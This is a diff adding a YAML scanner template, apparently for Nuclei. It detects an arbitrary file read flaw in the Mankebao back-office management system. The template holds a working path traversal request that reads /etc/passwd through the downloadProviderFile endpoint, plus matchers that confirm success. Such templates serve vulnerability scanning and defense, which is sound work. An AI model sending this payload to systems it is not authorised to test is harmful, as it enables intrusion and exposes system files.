@@ -1,0 +1,33 @@
+id: poc-yaml-mankebao-bms-downloadproviderfile-anyfile-read
+info:
+  name: 满客宝后台管理系统 downloadProviderFile 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/warehouse/api/v1/provider/downloadProviderFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "attachment;filename="
+        part: header
+      - type: word
+        words:
+          - "application/doc"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
